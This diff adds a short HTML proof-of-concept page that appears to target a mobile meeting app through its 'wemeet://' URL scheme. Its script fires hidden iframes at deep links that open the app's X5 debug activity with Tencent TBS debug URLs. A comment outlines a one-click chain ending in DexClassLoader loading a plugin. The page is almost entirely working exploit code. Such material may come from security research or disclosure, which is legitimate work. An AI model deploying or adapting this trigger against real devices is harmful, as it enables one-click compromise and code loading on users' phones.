@@ -1,0 +1,26 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P18</h1>
+<script>
+document.title='P18L-START';
+/* 1-click: iframe Java RouterMapping → X5DebugActivity extras.url
+   → raw X5 loadUrl → TBS showDebugView → DexClassLoader(DebugPlugin) */
+var tbs='https://debugtbs.qq.com';
+var tbsFunc='https://debugtbs.qq.com?func=installonline_core';
+var schemes=[
+  'wemeet://page/profile/aboutus/x5_debug?url='+encodeURIComponent(tbs),
+  'wemeet://page/profile/aboutus/x5_debug?url='+encodeURIComponent(tbsFunc)
+];
+var i=0;
+function fire(){
+  if(i>=schemes.length){ document.title='P18L-DONE-IFRAMES'; return; }
+  var s=schemes[i++];
+  document.title='P18L-IFRAME-'+i;
+  var f=document.createElement('iframe');
+  f.src=s;
+  document.body.appendChild(f);
+  setTimeout(fire, 4000);
+}
+setTimeout(fire, 800);
+</script>
+</body></html>
